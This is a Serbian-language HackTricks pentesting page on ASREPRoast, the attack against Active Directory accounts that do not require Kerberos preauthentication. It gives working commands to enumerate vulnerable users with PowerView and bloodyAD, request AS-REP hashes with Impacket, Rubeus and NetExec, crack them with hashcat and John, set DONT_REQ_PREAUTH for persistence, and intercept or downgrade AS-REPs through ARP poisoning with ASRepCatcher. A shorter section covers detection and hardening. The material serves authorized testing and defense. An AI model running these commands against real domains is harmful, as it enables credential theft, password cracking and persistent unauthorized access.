# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je security attack koji iskorišćava korisnike kojima nedostaje atribut **Kerberos pre-authentication required**. U suštini, ova ranjivost napadačima omogućava da zatraže authentication za korisnika od Domain Controller-a (DC) bez potrebe za korisničkom lozinkom. DC zatim odgovara porukom enkriptovanom ključem izvedenim iz korisničke lozinke, koju napadači mogu pokušati da crack-uju offline kako bi otkrili korisničku lozinku.

Glavni zahtevi za ovaj attack su:

- **Lack of Kerberos pre-authentication**: Ciljni korisnici ne smeju imati omogućenu ovu security funkciju.
- **Connection to the Domain Controller (DC)**: Napadačima je potreban pristup DC-u kako bi slali zahteve i primali enkriptovane poruke.
- **Optional domain account**: Domain account omogućava napadačima da efikasnije identifikuju ranjive korisnike pomoću LDAP upita. Bez takvog account-a, napadači moraju da pogađaju usernames.

#### Enumerisanje ranjivih korisnika (potrebni domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zahtev za AS_REP poruku
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus podrazumevano zahteva **RC4**, pa Event ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodate **`/aes`** (ili je RC4 onemogućen za cilj), očekujte **AES etypes**. <sup>[[2]](#references)</sup>

#### Brzi one-liners (Linux)

- Prvo enumerišite potencijalne ciljeve (npr. iz leaked putanja buildova) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Izvršite roast cele liste korisničkih imena bez validnih kredencijala koristeći NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ako imate kredencijale, prepustite NetExec-u da upita LDAP i zatraži svaki roastable nalog: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ako izlaz počinje sa **`$krb5asrep$23$`**, crackujte ga pomoću Hashcat-a **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, prednost dajte John-u **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Nemojte pretpostaviti da je svaki AS-REP roast RC4. Moderni alati mogu vratiti **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), u zavisnosti od zahtevanog/negociranog enctype-a. **`hashcat -m 18200`** je namenjen za **etype 23**, dok **John** direktno podržava `krb5asrep` za **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Perzistencija

Podesite da **preauth** nije obavezan za korisnika nad kojim imate dozvole **GenericAll** (ili dozvole za upisivanje svojstava):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Detekcija i hardening

Uspešan roast proizvodi događaj **4768** na DC-u sa `Status=0x0` i `PreAuthType=0`. Nemojte zahtevati RC4 u detekciji: `TicketEncryptionType=0x17` je koristan signal slabe enkripcije, ali napadač može zahtevati AES (vrednosti u event logu `0x11`/`0x12`). Na Windows Server 2016 i novijim verzijama, sa kumulativnim ažuriranjem od 14. januara 2025. (ili novijim), verzija 2 događaja 4768 takođe prikazuje `ClientAdvertizedEncryptionTypes`, podržane etypes naloga/DC-a i dostupne ključeve.<sup>[[5]](#references)</sup>

Praktičan hunt označava klijenta koji oglašava samo RC4 dok nalog ima AES ključeve, a zatim koreliše nalete sa jedne izvorne IP adrese kroz više korisnika bez preautentifikacije. Napravite baseline legitimnih izuzetaka umesto da generišete alert za svaki događaj sa `PreAuthType=0`.

Trajno rešenje je uklanjanje opcije **Do not require Kerberos preauthentication** za svakog korisnika kome ona strogo nije potrebna i rotiranje lozinki izloženih naloga. Ako izuzetak ne može da se ukloni, koristite dugu, nasumično generisanu lozinku i minimalne privilegije. Onemogućavanje RC4 povećava cenu cracking-a, ali ne uklanja roastability, jer AS-REP odgovori zasnovani na AES-u i dalje mogu da se crack-uju offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bez credentials

Napadač na putanji može da presretne AS-REP vraćen tokom normalne, preautentifikovane AS razmene i formatira njegov enkriptovani deo za offline cracking. Za razliku od klasičnog ASREPRoasting-a, ovo ne zahteva `DONT_REQ_PREAUTH`; međutim, dobijaju se samo nalozi čija je Kerberos razmena zaista presretnuta. **ASRepCatcher** podrazumevano dobija poziciju pomoću jednosmernog ARP poisoning-a ili može da koristi saobraćaj iz druge MitM tehnike sa `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Ako želite srodni trik bez credentials-a koji vraća **service ticket** umesto **TGT**-a od principal-a bez preautentifikacije, pogledajte [Kerberoast](kerberoast.md).

U režimu `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) prosleđuje presretnute AS-REQ-ove i forsira **RC4** kada ga obe strane još uvek dozvoljavaju. `listen` ne menja pakete i zato hvata enctype koji su klijent i DC dogovorili. Ograničite poisoning pomoću `-t`/`-tf` umesto da, kada je moguće, obuhvatite celu podmrežu.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Događaj 4768: Zatražena je Kerberos autentikaciona karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
